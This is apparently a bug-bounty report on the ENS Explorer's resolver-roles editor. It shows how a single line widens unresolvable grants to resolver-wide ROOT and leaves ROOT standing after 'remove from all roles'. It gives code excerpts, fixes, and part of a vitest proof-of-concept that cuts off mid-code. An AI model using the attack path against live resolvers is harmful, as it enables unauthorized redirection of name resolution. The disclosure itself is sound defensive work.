# 92527 w a critical the explorer s resolver roles editor writes a scope the administrator never chose narrow grants are signed as resolver wide root and remove from all roles leaves root sta&#x20;

## #92527 \[W\&A-Critical] The Explorer's resolver-roles editor writes a scope the administrator never chose: narrow grants are signed as resolver-wide (ROOT), and "remove from all roles" leaves ROOT sta...

**Submitted on Sep 10th 2026 at 13:24:10 UTC by @Thrush48610 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92527
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

### Description

## The Explorer's resolver-roles editor writes a scope the administrator never chose: narrow grants are signed as resolver-wide (ROOT), and "remove from all roles" leaves ROOT standing

**Asset:** `apps/portal` (Explorer) — named in the program's Assets in Scope **Route:** `/resolver/$address/roles` **Impact row:** Critical — *"Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters"* **Proposed severity:** Critical — the row this maps to (mitigating factors stated in §4.2) **Verified against:** Sepolia fork pinned at block `11661247`; live indexer `https://staging-graphql.ens.dev/` **Artifacts:** 2 PoC files, 11 tests, all passing

***

### 1. Summary

The Explorer lets the administrator of a `PermissionedResolver` manage who may write which records, at `/resolver/$address/roles`. Each role holder is a table row; clicking a row opens a sidebar where the admin ticks permissions and clicks **Save**, or clicks **Remove user**.

The resolver contract scopes every grant to a **resource** — a 32-byte hash. A grant may be global (the ROOT resource), scoped to a whole name, or scoped to an individual record. The Explorer's sidebar reduces whatever a row carries to **one string**, and in that encoding the empty string means *root*. Two opposite failures follow from that single reduction.

#### 1.1 The app can only compute one kind of resource

`buildResourceToNameMap` is the whole of the app's reverse lookup. It maps the ROOT resource to `'(root)'` and then adds exactly one entry per node — `resource(node, 0)`, the whole-name resource:

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L147-L160>

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:147-160
export const buildResourceToNameMap = (
  nodes: readonly { readonly name: string }[],
): Map<string, string> => {
  const map = new Map<string, string>()
  map.set(ROOT_RESOURCE, '(root)')

  for (const node of nodes) {
    if (node.name) {
      map.set(computeNameResource(node.name).toLowerCase(), node.name)
    }
  }

  return map
}
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L137-L142>

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:134-141
/**
 * Compute the EAC resource ID for a name (with part = 0).
 * Mirrors `PermissionedResolverLib.resource(node, 0)` in Solidity.
 */
export const computeNameResource = (name: string): string =>
  keccak256(
    encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]),
  )
```

The library the app itself calls exposes **four** grant scopes, three of which produce resources this map can never contain:

```js
// @ensdomains/ensjs/dist/actions/wallet/v2/grantResolverRoles.js:21-51
case 'root': ... functionName: 'grantRootRoles'
case 'name': ... functionName: 'authorizeNameRoles'
case 'text': ... functionName: 'authorizeTextRoles'
case 'addr': ... functionName: 'authorizeAddrRoles'
```

A `text`- or `addr`-scoped grant hashes a different preimage, so it is unmappable regardless of what the node list contains. So is a `name`-scoped grant whose name has left the node list.

#### 1.2 The grouping merges every grant an account holds into one row

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/lib/roles/resolverRoles.ts#L176-L179>

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:176-179, 197
/**
 * Groups resolver roles by account, decodes bitmaps, and resolves
 * resource hashes to human-readable names when possible.
 */
export const groupRolesByAccount = <T extends RoleInput>(
...
    const resolvedName = resourceToName?.get(resource) ?? null
```

Note two things the authors already knew: names resolve **"when possible"**, and failure is materialised as `null`. The grouping keys on the **account alone**, so an account holding a ROOT grant *and* name-scoped grants collapses into a single row whose `resolvedNames` is a set containing `'(root)'` plus each resolvable name.

#### 1.3 The display layer handles "unknown" correctly. The write layer does not.

The table renders nothing when the set is empty:

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L70>

```tsx
// apps/portal/src/features/resolver/components/ResolverRolesTable.tsx:70
      if (names.length === 0) return null
```

The sidebar's scope hint is suppressed by the same condition, and when the set contains `'(root)'` it reports the row as global:

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L391-L395>

```tsx
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-395
                {selectedAccount && resolvedNames.length > 0 && (
                  <p className="text-sm text-muted-foreground">
                    {resolvedNames.includes('(root)')
                      ? 'Global roles (all names)'
                      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
```

Three code sites therefore already model "unknown" and "multiple". The **fourth** site — the one that decides what gets signed — flattens the set to one string:

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L167-L169>

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:167-169
  const resolvedNames = row?.original.resolvedNames ?? []

  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

That single `roleName` drives **both** writes:

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:299  (Save)
      name: roleName,
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:318  (Remove user)
      name: roleName,
```

#### 1.4 The empty string is not neutral — it is the ROOT sentinel

```ts
// apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:20
  /** Dotted name (e.g. "myname.eth") or empty string for ROOT_RESOURCE (all names). */
```

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts#L47-L57>

```ts
// apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:47-57
    name === ''
      ? {
          resolverAddress,
          targetAccount: account,
          scope: 'root',
...
          scope: 'name',
```

`revokeResolverRoles.ts:47-57` is the structurally identical branch — same condition, same two scopes; the role-type cast and function names differ.

#### 1.5 The two failures

**Over-grant.** When `resolvedNames` is empty, `find` returns `undefined`, `?? ''` yields the ROOT sentinel, and Save emits `grantRootRoles` — authority over every record of every name on the resolver — instead of a scoped grant.

**Under-revoke.** When `resolvedNames` contains `'(root)'` *and* names, `find` **skips root** and returns the first name. Remove user then emits `authorizeNameRoles(<one name>, …, false)`:

```js
// @ensdomains/ensjs/dist/actions/wallet/v2/revokeResolverRoles.js:25, 32
                functionName: 'revokeRootRoles',        // scope 'root'
                functionName: 'authorizeNameRoles',     // scope 'name', last arg false
```

One name grant is revoked. **The ROOT grant is never addressed** — under a sidebar reading *"Global roles (all names)"* and a dialog reading:

```tsx
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:446
                Are you sure you want to remove this user from all roles? This
```

#### 1.6 Nothing discloses the scope before signing

The transaction the admin is shown names only the account:

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:343, 348
      transactionName: `Remove user ${account}`,
      transactionName: `Update roles for ${pendingAction?.account ?? ''}`,
```

The table cell is blank (`ResolverRolesTable.tsx:70`), the scope hint is suppressed (`ResolverRolesSidebar.tsx:391`), and the page offers **no control by which scope can be expressed at all** — unlike the sibling Add User sheet, which does:

```tsx
// apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:39, 258
const ROOT_NODE_VALUE = ''
                          Root (all nodes)
```

The same team treats scope as something the admin must see when creating a grant. The edit path never shows it — and the divergence goes beyond the form. The **create** path also names the scope in the transaction the wallet is asked to sign:

```ts
// apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:321
  transactionName: `Grant resolver roles for ${pendingGrant?.name || '(root)'}`,
```

while the **edit** path, for the same operation on the same contract, names only the account (`ResolverRolesSidebar.tsx:343, 348`). One feature, two paths, scope disclosed in exactly one.

***

### 2. Root cause and the buggy line

#### 2.1 The line

<https://github.com/immunefi-team/audit-comp-ens/blob/1c9b47f18fcddd2e864dfe385c4171061c9811ae/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L169>

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:169
  const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

#### 2.2 Why it is wrong

`resolvedNames` is a **set** with three meaningful states, and this line projects all three onto a single `string` in which `''` already carries a specific meaning:

| `resolvedNames`                             | line 169 yields | scope written | correct?                               |
| ------------------------------------------- | --------------- | ------------- | -------------------------------------- |
| `[]` — scope not determinable               | `''`            | `root`        | **No — over-grants**                   |
| `['(root)', 'a.eth', …]` — root *and* names | `'a.eth'`       | `name`        | **No — under-revokes; ROOT untouched** |
| `['(root)']`                                | `''`            | `root`        | Yes, by coincidence of the encoding    |
| `['a.eth']`                                 | `'a.eth'`       | `name`        | Yes                                    |

Two of four cases are wrong, and the two that are right are right by accident of how `''` happens to encode — not by design.

**The same projection also fails in two further ways, neither of which needs a separate demonstration.** A `text`- or `addr`-scoped grant hashes a different preimage from `resource(node, 0)`, so it can never appear in the map — that follows from the construction in §1.1, not from any observation. And `resolver.nodes` is served paginated: measured live on `0x43ee991f5c681f55216ac7cb8cf3fb3883cd787d`, `nodeCount` is **159,165** while the query returns **100**, so a name-scoped grant outside the returned page is unmappable for the same reason. Both land in row 1 of the table above. This report demonstrates the two paths whose preconditions the Explorer itself can create (§3.1, §3.2); these two are noted because they widen the population of rows that reach the same line, not as separate claims.

This is not a missing null check. It is a **type error in the domain model**: a set is being stored in a scalar whose empty value is overloaded to mean maximal authority. The fail-open direction is what makes it a security defect rather than a display bug — an *unknown* scope is resolved to the *widest* scope the contract offers, when the only safe behaviour is to refuse to write.

#### 2.3 This is not intended behaviour

The `name === '' → root` sentinel **is** deliberate — it is documented at `grantResolverRoles.ts:20` and it is what the Add User sheet's `ROOT_NODE_VALUE = ''` (`ResolverAddUserSheet.tsx:39`) legitimately uses. That is not the defect.

The defect is that line 169 **manufactures that sentinel from an error state**. The evidence that this was never intended is internal to the same feature:

1. `groupRolesByAccount` documents that it resolves names *"when possible"* (`resolverRoles.ts:177`) and materialises failure as `null` (`:197`) — the authors modelled an unresolvable resource.
2. `ResolverRolesTable.tsx:70` and `ResolverRolesSidebar.tsx:391` both branch on the empty case for **display**.
3. Only `:169` — the write path — collapses it, and collapses it upward.

Three sites know the state exists. The fourth converts it into a grant.

#### 2.4 Contributing defects

* **`groupRolesByAccount` keys on account alone** (`resolverRoles.ts:194`, `:199`, `:208`), so distinct grants at distinct resources merge into one row. This is **intended and tested** behaviour (`resolverRoles.test.ts:185-197`), not a defect — it is listed because it is what makes the multi-valued case reachable, and because the sidebar then edits a row as though it were a single grant. Fix 2 changes it deliberately.
* **The app never asks for the data that would fix this.** The indexer already serves a `namedResources` array giving `name`, `resource`, `recordKind` and `recordKey` per resource (`packages/indexer/graphql.gen.ts:381-390, 927`). `grep -rn "namedResources" apps/portal/src` returns **nothing** — the field is in the generated schema and the app never queries it. *(For precision: the app does request a per-row `name` on the roles themselves, `useResolverOverview.ts:97`, but the indexer returns `null` for it on every resolver-scoped row, and `groupRolesByAccount` resolves names from the node map rather than that field regardless (`:197`). Reading it would fix nothing — `namedResources` is the field that carries the mapping.)* Measured live on 2026-09-10 it resolves **59 of 59** non-root resources across the eleven resolvers in my census set. **It is not universal, and I name the counterexample rather than quote a rate:** resolver `0x694a2f963164c152a23b91ef0de53fe9b02ae1e3` carries **8 non-root role rows and announces nothing at all** (`namedResources: []`). Entries are emitted on the *first role grant per resource*, so a resource whose grant predates indexing stays unnamed. This is exactly why Fix 1 must ship regardless of Fix 3: coverage is high, not total, and the failure mode is fail-open.

***

### 3. Attack path

**There is no attacker-controlled input anywhere in this path, and none is claimed.** The transaction is constructed by the app with an argument the administrator never expressed, could not see, and had no control to express. This is the *"modifying transaction arguments or parameters"* impact line, not a narrative intrusion.

#### 3.1 Primary path — global authority survives a removal the UI reports as complete

Every step below uses shipped Explorer code only. Proven end to end by `apps/portal/src/features/resolver/poc-f1b-path4-revoke-survives.test.tsx` (5 tests).

**Step 0 — starting state.** A contractor account holds **nothing** on the resolver. Asserted on chain: `hasRootRoles` false for each bit, `roles(resource, account) == 0`, and the contractor cannot write any record (negative control, transaction reverts).

**Step 1 — the admin grants global roles.** Through the real **Add User** sheet, choosing its own `"Root (all nodes)"` option (`ResolverAddUserSheet.tsx:258`, value `''` per `:39`). The app emits `grantRootRoles` — verified by selector, and confirmed on chain. *This is correct behaviour and a legitimate operation.*

**Step 2 — the admin also grants a name-scoped role to the same account.** Same sheet, a name from the dropdown (`nameOptions = nodes.map((n) => n.name).filter(Boolean)`, `ResolverAddUserSheet.tsx:186`). The app emits `authorizeNameRoles` — again correct. There is no duplicate-account guard: `canSave` (`ResolverAddUserSheet.tsx:183`) checks a resolved address, that resolution is not in flight, at least one role, and that the sheet is not already in its success state — nothing about existing grants.

**Step 3 — the two grants collapse into one row.** `groupRolesByAccount` (`resolverRoles.ts:194`, `:199`, `:208`) keys on account, producing `resolvedNames = ['(root)', '<name>']`.

**Step 4 — the admin decides to remove the contractor.** The sidebar renders **"Global roles (all names)"** (`ResolverRolesSidebar.tsx:394`, because the set includes `'(root)'`). The confirmation dialog reads *"remove this user from all roles"* (`:446`). Both statements are true descriptions of the admin's intent.

**Step 5 — the app sends something else.** Line 169 skips `'(root)'` and returns the name; `handleRemoveUser` passes it as `name` (`:318`); `revokeResolverRoles.ts:47` sees a non-empty name and selects `scope: 'name'`; ensjs emits `authorizeNameRoles(<name>, bitmap, account, false)`. The connected wallet signs it. The transaction succeeds.

**Step 6 — measured outcome.** The name-scoped grant **is** revoked — asserted, so this is not a failed transaction — and `hasRootRoles(ROLE_SET_ADDR, contractor)` is still **true**.

**Step 7 — consequence.** The "removed" contractor writes records it was never scoped to: the apex, and a name that **already resolved to a real address**, asserted non-zero and not the attacker before the write, then rewritten. This is a redirect of live resolution by an account the administrator was told had been removed.

#### 3.2 Second path — a correct narrow grant becomes resolver-wide after routine housekeeping

Proven by `poc-f1c-pathb-orphaned-row.test.tsx` (6 tests).

1. The admin grants a **name-scoped** role through the Add User sheet. Correct, mappable, and the row displays *"Roles scoped to …"*.
2. That name's resolver is later changed through the Explorer's own `/$name/change-resolver` route — gated on `ROLE_SET_RESOLVER` for the name's parent registry (`apps/portal/src/routes/$name/change-resolver.tsx:52-59`), a role held by the **name owner**, who need not be the resolver administrator.
3. Role rows live in the resolver's access-control table keyed by resource hash; the resolver pointer lives in the registry. They are independent state, so **the grant survives** while the name leaves `resolver.nodes`.
4. `buildResourceToNameMap` can no longer resolve that resource. The row goes blank.
5. The next Save emits `grantRootRoles`. Measured: the contractor gains ROOT and rewrites the apex.

**What is and is not observable in production, stated precisely.** On resolver `0xf846fb5a0e36531c848fb8ae0ea9e9f82f882852`, `namedResources` names four grant-carrying names that `resolver.nodes` does not return at all — `alice.acme.eth`, `fleet-policy.acme.eth`, `invoice-8871.payments-bot.acme.eth`, `payments-bot-v2.acme.eth` — with `nodeCount == nodes.length == 7`, so no truncation is involved. `resolver.nodes` is therefore **not** a superset of the names that carry role rows, and rows referencing names outside it are a normal state of a live resolver.

**Those four do not demonstrate&#x20;*****this*****&#x20;path, and I do not claim they do.** Each carries a **record**-scoped row (`alice.acme.eth` as `addr`; `fleet-policy.acme.eth` as `text/policy`; `payments-bot-v2.acme.eth` as `text/agent-endpoint`), not a name-scoped one. Record-scoped resources were never mappable in the first place — that is the record-scoped case noted in §2.2, not this one. A name-scoped grant orphaned by a resolver change is proven by the PoC below, which creates the condition through the shipped UI; I have not observed that specific sequence on a live resolver and do not assert it.

### 4. Impact

#### 4.1 The impact line

> *Malicious interactions with an already-connected wallet, such as: **Modifying transaction arguments or parameters** …*

The Explorer synthesises a `scope` argument that the administrator never expressed, cannot see, and has no control on the page to express, and the connected wallet signs it. `scope` is the only argument separating a single-name grant from authority over every record of every name.

On the row's word *"Malicious"*: the same row's own fourth example — *"Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated)"* — is a pure missing-validation case with no adversary, and is verbatim the programme's own known issue `EXP-4337-002`. A "such as" list enumerates instances of its row; the word describes the character of the interaction the wallet is led into, not the presence of an attacker.

**A second row matches independently, and the finding does not depend on which is preferred.** *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient"* — also Critical. The sidebar displays **"Global roles (all names)"** (`ResolverRolesSidebar.tsx:394`) and the dialog promises removal **"from all roles"** (`:446`), while the transaction the wallet is handed revokes one name and leaves ROOT standing. That is an incorrect transaction detail displayed to a user who then submits on the strength of it, with no reliance on the word *"Malicious"* at all.

#### 4.3 Fault attribution, and whether the administrator could have detected it

**Not user error.** In both paths every administrator action is correct and is the action the UI invites: the Add User sheet's own default scope, its own name dropdown, its own Save and Remove buttons, and the Explorer's own Change Resolver route. No step is a misuse, and no documentation tells the administrator to avoid any of it.

**Not the administrator's fault for failing to notice.** Detection would require the administrator to see the scope, and the application removes every opportunity to:

| Where scope could surface            | What is shown                                                      |
| ------------------------------------ | ------------------------------------------------------------------ |
| Roles table Name cell                | blank — `ResolverRolesTable.tsx:70` returns `null`                 |
| Sidebar scope hint                   | suppressed on the empty set — `ResolverRolesSidebar.tsx:391`       |
| Sidebar hint when root is present    | *"Global roles (all names)"* — true, and still not what is written |
| Remove dialog                        | *"remove this user from all roles"* — a false statement            |
| Transaction name shown to the wallet | account only — `:343`, `:348`                                      |

The comparison that settles it is internal: the **create** path names the scope in the very transaction the wallet is asked to sign — `` transactionName: `Grant resolver roles for ${pendingGrant?.name || '(root)'}` `` (`ResolverAddUserSheet.tsx:321`). The **edit** path, for the same operation on the same contract, names only the account. The team already decided scope is something the signer must see; one of the two paths does not do it.

**Nor is it the app behaving consistently with what the administrator asked.** In the revoke direction the app's own on-screen description of the operation and the calldata it produces disagree, from the same `roleName` value, on the same click.

***

### 5. Fix

#### Fix 1 — make scope a three-state value and refuse to write when it is unknown

This is the minimal correct fix, and it alone closes both **demonstrated** failures. It does not resolve every multi-valued case, and I state the two it leaves open rather than imply otherwise. A row carrying **several non-root names** still takes the `name` branch and writes the first of them. A row carrying **root plus an unmappable resource** reduces to `['(root)']` — the unmappable grant contributes nothing — so the write goes to root and the record-scoped grant survives untouched. Neither case refuses the write; both need Fix 2's one-row-per-grant keying. Neither is demonstrated on chain today, and I do not claim they are: the point is that Fix 1 is necessary and not sufficient.

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx — replacing :169
type RowScope =
  | { kind: 'root' }
  | { kind: 'name'; name: string }
  | { kind: 'unknown' }

const scope: RowScope =
  resolvedNames.length === 0
    ? { kind: 'unknown' }
    : resolvedNames.includes('(root)')
      ? { kind: 'root' }
      : { kind: 'name', name: resolvedNames[0] }
```

Then gate both writes on it, and disable **Save** and **Remove user** when the scope is `unknown`, with a visible explanation rather than a silent default. The write helpers should take the discriminated union directly instead of an overloaded `string`, so that `grantResolverRoles.ts:47` and `revokeResolverRoles.ts:47` can no longer receive a value that means "root" by accident.

Note the ordering consequence: a row carrying **both** root and names must be treated as `root`, not as its first name. That is what stops the under-revoke.

#### Fix 2 — key the grouping on `(account, resource)`

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:194 — grouping key
const key = `${role.account.toLowerCase()}|${role.resource.toLowerCase()}`
```

**This overrides specified, tested behaviour, and I name it rather than let a reviewer find it.** `apps/portal/src/lib/roles/resolverRoles.test.ts:185-197` — *"should merge the same account across resources"* — asserts `toHaveLength(1)` for exactly the account-only keying this fix removes. Account-level merging is intentional and covered; Fix 2 is therefore a **deliberate redesign**, not the correction of an oversight, and that test must be revised alongside it.

That test is also the strongest available evidence about intent, which is why §2.3 rests on the sidebar rather than on the grouping: the authors explicitly contemplated a single row carrying grants at **several resources**, wrote a test for it, and wrote **no test at all** for what the sidebar does with such a row. The multi-valued case was designed for in the data layer and left unhandled in the write layer.

One row then means one grant, and the sidebar edits exactly what the row represents. Two consequences to accept: an account with several grants occupies several rows, and "Remove user" becomes per-grant — which is what the contract actually supports. The dialog copy must change accordingly (Fix 5).

#### Fix 3 — query `namedResources` (the primary remedy)

The indexer already serves the mapping the app is missing (`packages/indexer/graphql.gen.ts:381-390, 927`). Measured live on 2026-09-10 it resolves **59 of 59** non-root resources across my eleven-resolver census set — but **not universally**: resolver `0x694a2f96…` has 8 non-root rows and an empty `namedResources`. Fix 3 therefore reduces the `unknown` state; it does not eliminate it. Add it to the resolver-overview query and build the lookup from it instead of from `nodes`:

**Carry the record kind, or this fix introduces a worse bug than it closes.** The naive form —

```ts
map.set(entry.resource.toLowerCase(), entry.name)   // WRONG — loses the scope
```

— discards `recordKind` and `recordKey`, and the write path keys entirely off "is there a name?". A **record**-scoped resource would then map to a bare name, take the `scope: 'name'` branch, and be rewritten as a **name-wide** `authorizeNameRoles`: a *new over-grant* wearing a correct-looking label, strictly worse than the blank row it replaces because the row would now display a plausible scope.

Live examples that would be mis-widened this way: `alice.acme.eth` is announced as `addr`, `fleet-policy.acme.eth` as `text/policy`, `payments-bot-v2.acme.eth` as `text/agent-endpoint`.

Carry the full entry and resolve to a four-state scope matching the four the contract offers:

```ts
map.set(entry.resource.toLowerCase(), {
  name: entry.name,
  kind: entry.recordKind,   // 'name' | 'text' | 'addr' | 'data'
  key: entry.recordKey,
  coinType: entry.coinType,
})
```

and have the write helpers select `authorizeTextRoles` / `authorizeAddrRoles` accordingly. If that is more than the team wants to take on, **do not use `namedResources` to drive writes at all** — use it only to *display* the true scope, and let Fix 1 refuse the write.

This fixes all four paths at once: record-scoped resources become nameable, orphaned names stay nameable after a resolver change, and truncation of `nodes` stops mattering. With Fix 3 in place the `unknown` state becomes rare — but Fix 1 must still ship, because "rare" is not "impossible" and the failure mode is fail-open.

#### Fix 4 — add a scope control to the edit path

The Add User sheet already has one (`ResolverAddUserSheet.tsx:249-289`). The edit path has none, which is why the administrator cannot express the argument the app invents. Render the row's scope and require an explicit choice for any write that would change it.

#### Fix 5 — make the UI tell the truth

* Render the scope in `transactionName` (`ResolverRolesSidebar.tsx:343, 348`) so the confirmation screen distinguishes a one-name grant from a resolver-wide one.
* Correct the Remove dialog (`:446`). *"Remove this user from all roles"* must either become accurate — by revoking every grant the account holds — or state exactly which grant is being revoked.
* Show something in the Name cell for an unresolved resource (`ResolverRolesTable.tsx:70`) rather than an empty cell: the truncated resource hash and an explicit "scope unknown" marker.

#### Fix 6 — align the permission gate

The route enables management on the root **manager** bit (`apps/portal/src/routes/resolver/$address/roles/index.tsx:41-50`, `roles: ['ROLE_SET_ADDR']`), while `grantRootRoles` requires the **admin** variant. An editor holding only the manager bit sees Save enabled, signs, and the transaction reverts. This is a fail-safe rather than a vulnerability, but it should be corrected alongside the above.

### Proof of Concept

### Proof of Concept

#### poc-f1c-pathb-orphaned-row\.test.tsx

```ts
import { type ChildProcess, spawn } from 'node:child_process'
import {
  createServer,
  request as nodeHttpRequest,
  type Server,
} from 'node:http'
import {
  TransactionManagerProvider,
  transactionManager,
} from '@ens-apps/transaction-manager'
import { QueryClientProvider } from '@tanstack/react-query'
import {
  createMemoryHistory,
  createRootRoute,
  createRouter,
  RouterProvider,
} from '@tanstack/react-router'
import {
  cleanup,
  render,
  screen,
  waitFor,
  within,
} from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { mock } from '@wagmi/connectors'
import { useEffect } from 'react'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  custom,
  type Hex,
  toFunctionSelector,
} from 'viem'
import { sepolia } from 'viem/chains'
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from 'vitest'
import {
  type Config,
  createConfig,
  useConnect,
  useConnection,
  usePublicClient,
  WagmiProvider,
} from 'wagmi'
import { closeTransactionModal } from '@/features/transaction-manager/hooks/useTransactionModal'
import { createTestQueryClient, sepoliaWithEns } from '@/test-utils'

// ── the real production fixture ─────────────────────────────────────────────
const RESOLVER = '0xf846fb5a0e36531c848fb8ae0ea9e9f82f882852' as Address
const ADMIN = '0x05c224fcdb88e75a7178a3c14d92920598ef4e1c' as Address
const DELEGATE = '0x0098fe9be558fa0ba57a0fef68f32eb031f75dd7' as Address
const ATTACKER = '0x00000000000000000000000000000000DeaDBeef' as Address
/** The contractor. Holds NOTHING on this resolver — asserted in test 0. */
const CONTRACTOR = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8' as Address
/** The subname the contractor is scoped to, and which Acme later migrates. */
const SCOPED_NAME = 'sarah.acme.eth'
const SCOPED_LABEL = 'sarah'
/** acme.eth's own subregistry — the parent registry for its subnames. */
const ACME_SUBREGISTRY = '0xb95B6961596cccBAf759bf40E69A6FC81ff20F64' as Address
/** Any other resolver address; the migration target. */
const NEW_RESOLVER = '0x000000000000000000000000000000000000bEEF' as Address
/**
 * A name that ALREADY resolves to a real address on chain. Overwriting it is a
 * REDIRECT of live resolution, not the filling of a blank record — a stronger
 * and more precise impact claim than writing the (empty) apex alone.
 */
const ALREADY_RESOLVING = 'payments-bot.acme.eth'

const NODE_OWNERS: Readonly<Record<string, string>> = {
  'acme.eth': '0x05c224fcdb88e75a7178a3c14d92920598ef4e1c',
  'sarah.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'payments-bot.acme.eth': '0x0098fe9be558fa0ba57a0fef68f32eb031f75dd7',
  'demo-two.acme.eth': '0xdb768b53719039796ae12f0d97cb5bbbfa7fb862',
  'demo-three.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'demo-four.acme.eth': '0x4806d97dcfe6689b7cf094fcd0b08d684bc984a2',
  'demo-mandate.acme.eth': '0x91b437e16c1b41b3b03467fae632b6d16455263a',
}

const NAMES: readonly (readonly [string, Hex])[] = [
  [
    'acme.eth',
    '0x071164d92aaa35b63eca1e82408f284624fc0f7cc0d84867043120b79ea9e056',
  ],
  [
    'demo-two.acme.eth',
    '0x24d78dcbb852a3833606742f3c56a4ef8d122e442818c583861d5d332368586d',
  ],
  [
    'sarah.acme.eth',
    '0xad96ef982923c64c17d918b58a73b04aeb546650ea844a2ee9898d2db30fb401',
  ],
  [
    'payments-bot.acme.eth',
    '0xae61ad2a32da79edd965f686e63b000ada1a1059ae7286ce11c008238a8bc4f5',
  ],
  [
    'demo-four.acme.eth',
    '0x3a2800afb8e7dfee90c00eaa13eada0c791a6de6f881e56055cb82fbd6e47f3b',
  ],
  [
    'demo-three.acme.eth',
    '0x0dfe67b8ed85ed4d1564c8d8dc26d8d640d5c53256a254070ce52804493c1c7e',
  ],
  [
    'demo-mandate.acme.eth',
    '0xd94ef098e1e94cb5a80da4e20d25e3d944e32acd758c333f128582396e04004c',
  ],
]

const SET_ADDR_ABI = [
  {
    name: 'setAddr',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      { name: 'node', type: 'bytes32' },
      { name: 'a', type: 'address' },
    ],
    outputs: [],
  },
] as const
const ETH_REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as Address

const GET_RESOLVER_ABI = [
  {
    name: 'getResolver',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'label', type: 'string' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const
const ROLES_ABI = [
  {
    name: 'roles',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'resource', type: 'uint256' },
      { name: 'account', type: 'address' },
    ],
    outputs: [{ name: '', type: 'uint256' }],
  },
] as const
const HAS_ROOT_ROLES_ABI = [
  {
    name: 'hasRootRoles',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'roleBitmap', type: 'uint256' },
      { name: 'account', type: 'address' },
    ],
    outputs: [{ name: '', type: 'bool' }],
  },
] as const
const ADDR_ABI = [
  {
    name: 'addr',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'node', type: 'bytes32' }],
    outputs: [{ name: '', type: 'address' }],
  },
] as const

let anvilConfig: Config

import { ChangeResolverForm } from '@/features/resolver/components/ChangeResolverForm'
import { ResolverAddUserSheet } from '@/features/resolver/components/ResolverAddUserSheet'
import { ResolverRolesTable } from '@/features/resolver/components/ResolverRolesTable'
// The app's OWN resource derivation — used to build a MAPPABLE row for the
// positive control. Not re-implemented here.
import { computeNameResource } from '@/lib/roles/resolverRoles'

/**
 * A JSON-RPC transport over `node:http` instead of `fetch`.
 *
 * The test environment is happy-dom, which replaces global `fetch` and aborts
 * every in-flight request when a window is torn down (`cleanup()` between
 * tests). viem's built-in `http` transport uses global `fetch`, so the app's
 * real submission path intermittently dies with "RPC Request failed" the moment
 * React unmounts. Talking to anvil over node's own HTTP stack removes the DOM
 * emulator from the path entirely — it changes nothing about what is sent.
 */
const nodeRpc = (url: string) =>
  custom({
    async request({ method, params }: { method: string; params?: unknown }) {
      const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
      const u = new URL(url)
      return new Promise((resolve, reject) => {
        const req = nodeHttpRequest(
          {
            hostname: u.hostname,
            port: u.port,
            path: u.pathname || '/',
            method: 'POST',
            headers: {
